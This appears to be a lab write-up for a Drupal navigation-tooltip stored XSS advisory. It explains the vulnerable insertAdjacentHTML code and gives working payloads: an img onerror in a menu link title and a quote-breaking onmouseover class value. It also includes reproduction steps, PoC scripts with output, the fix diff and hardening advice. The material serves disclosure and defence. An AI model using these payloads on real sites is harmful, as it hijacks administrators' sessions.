# F3 — SA-CORE-2026-016 / CVE-2026-108514 — Navigation tooltip HTML / attribute injection

**Component:** `core/modules/navigation`
**Fixed in:** Drupal 11.4.10 (2026-10-14)
**Upstream rating:** Moderately critical
**Class:** Stored DOM XSS

---

## 1. The vulnerable code

`core/modules/navigation/js/tooltip.js:32-35` builds the tooltip wrapper as
an **HTML string**:

```js
Drupal.theme.tooltipWrapper = (dataset) =>
  `<div class="toolbar-tooltip ${dataset.drupalTooltipClass || ''}">
    ${dataset.drupalTooltip}
  </div>`;
```

and `core/modules/navigation/js/tooltip.js:45-52` injects it with
`insertAdjacentHTML()`:

```js
Drupal.behaviors.tooltipInit = {
  attach: (context) => {
    once('tooltip-trigger', '[data-drupal-tooltip]', context).forEach(
      (trigger) => {
        trigger.insertAdjacentHTML(
          'afterend',
          Drupal.theme.tooltipWrapper(trigger.dataset),
        );
```

`insertAdjacentHTML()` **parses** its argument as HTML. So the tooltip text
and the CSS class are not text — they are markup.

## 2. Two injection primitives

### 2.1 HTML injection through the tooltip text

`dataset.drupalTooltip` is the **decoded** value of the `data-drupal-tooltip`
attribute. Drupal renders the attribute value HTML-escaped, so
`<img src=x onerror=…>` is delivered as `&lt;img src=x onerror=…&gt;`; the
browser decodes it back into raw markup when it populates `dataset`; the
template then embeds that raw markup into an HTML string; `insertAdjacentHTML()`
parses it — and the `<img>` becomes a real DOM node with a live `onerror`
handler.

The tooltip is inserted at **attach time**, not on hover, so the payload fires
as soon as the page loads.

### 2.2 Attribute injection through the tooltip class

`dataset.drupalTooltipClass` is interpolated into `class="…"` **without
escaping**:

```js
`<div class="toolbar-tooltip ${dataset.drupalTooltipClass || ''}">
```

A value containing a double quote closes the attribute early and everything
after it becomes new attributes:

```
data-drupal-tooltip-class='admin-toolbar__tooltip" onmouseover="alert(1)'
```

renders as

```html
<div class="toolbar-tooltip admin-toolbar__tooltip" onmouseover="alert(1)">
```

## 3. Where the values come from in core

The behaviour attaches to **any** element carrying `data-drupal-tooltip`, and
core's own templates fill that attribute from several places:

| Template | Source of the tooltip text |
|----------|----------------------------|
| `core/modules/navigation/templates/navigation-menu.html.twig:30` | `item.title` — the **menu link title** |
| `core/modules/navigation/templates/block--navigation.html.twig:36-37` | `configuration.label` — the navigation block label |
| `core/modules/navigation/components/message/message.twig:9` | the toolbar message content |
| `core/themes/stable9/templates/navigation/*` | the same |

The advisory states the mitigation:

> This vulnerability is mitigated by the fact that an attacker must have a role
> with permission to enter HTML tags containing specific data attributes, or
> the `administer menu` permission.

That second half is the important one: **a menu link title is plain text**,
so a user holding `administer menu` would normally have no way to inject
markup into the toolbar. This bug gives them one.

## 4. How the lab reproduces it

### Path 1 — the attribute comes from the request

`lab/modules/vulnlab_nav/src/Controller/TooltipController.php` renders a
tooltip trigger whose `data-drupal-tooltip` and `data-drupal-tooltip-class`
come from the query string, and attaches the real
`navigation/internal.tooltip` library. This is the *"role with permission to
enter HTML tags containing specific data attributes"* scenario.

### Path 2 — core's own source: the menu link title

The provisioning script creates a menu link whose title is the payload, puts
it in a Navigation menu and places that menu in the navigation layout:

```php
// lab/scripts/provision.sh
$link->set("title", "<img src=x onerror=\"window.__vulnlab_tooltip_xss=true\">");
$link->set("menu_name", "vulnlab");
```

The Navigation module copies that title into `data-drupal-tooltip` — escaped,
as an attribute value has to be — and the vulnerable JS re-parses the decoded
value as markup.

The delivered markup looks like this (from the lab's admin toolbar):

```html
<a href="http://example.com"
   data-drupal-tooltip="&lt;img src=x onerror=&quot;window.__vulnlab_tooltip_xss=true&quot;&gt;"
   data-drupal-tooltip-class="admin-toolbar__tooltip" ...>
```

and the browser proof confirms the `onerror` handler fires.

Manual steps, if you want to do it by hand:

1. As a user with `administer menu`, create a menu link whose **title** is
   `<img src=x onerror="alert(document.domain)">`.
2. Put the link in a Navigation menu
   (*Structure → Navigation → Add menu*, then add the link to it) and place
   that menu in the navigation layout.
3. Load any admin page and hover the menu entry — the payload runs as soon
   as the tooltip is inserted, which happens on page load.

## 5. Proof of concept

### Standalone

```bash
node lab/standalone/f3_tooltip_xss.js
```

```
--- Vector 1: HTML injection via data-drupal-tooltip ---
<div class="toolbar-tooltip admin-toolbar__tooltip">
      <img src=x onerror="alert(document.domain)">
    </div>

contains an executable <img onerror> element : true

--- Vector 2: attribute injection via data-drupal-tooltip-class ---
<div class="toolbar-tooltip admin-toolbar__tooltip" onmouseover="alert(document.domain)">
      harmless text
    </div>
injected onmouseover handler present            : true
```

The script extracts the vulnerable `tooltipWrapper()` straight out of the
target's `tooltip.js`, so it always reflects the real shipped code.

### End to end (with a real browser)

```bash
python3 lab/poc/f3_navigation_tooltip_xss.py
```

```
=== Path 1 — tooltip attribute taken from the request ===
  [+] the page delivered a data-drupal-tooltip trigger
  [+] the tooltip payload EXECUTED: insertAdjacentHTML() re-parsed it as markup
```

## 6. Impact

Stored DOM XSS in the administrative toolbar. The payload runs for every
administrator who loads a page containing the toolbar, so a single poisoned
menu link title is enough to compromise every admin who visits the site.

## 7. The fix

```diff
-Drupal.theme.tooltipWrapper = (dataset) =>
-  `<div class="toolbar-tooltip ${dataset.drupalTooltipClass || ''}">
-      ${dataset.drupalTooltip}
-    </div>`;
+Drupal.theme.tooltipWrapper = (dataset) => {
+  const el = document.createElement('div');
+  el.classList.add('toolbar-tooltip');
+  if (dataset.drupalTooltipClass) {
+    dataset.drupalTooltipClass
+      .split(/\s+/)
+      .filter((token) => token !== '')
+      .forEach((token) => {
+        el.classList.add(token);
+      });
+  }
+  el.textContent = dataset.drupalTooltip || '';
+  return el;
+};
```
```diff
-          trigger.insertAdjacentHTML(
+          trigger.insertAdjacentElement(
             'afterend',
             Drupal.theme.tooltipWrapper(trigger.dataset),
           );
```

`textContent` can never be markup, and `classList.add()` takes the class
tokens one at a time, so neither value can break out of its context.

## 8. Hardening advice for site builders

* Upgrade to 11.4.10.
* Restrict `administer menu` to trusted roles; it is a privilege that now
  implies script injection into the admin toolbar.
* If you let untrusted users post raw HTML (the `unfiltered_html` route),
  remember that any markup they can inject can carry a `data-drupal-tooltip`
  attribute and become a tooltip trigger.
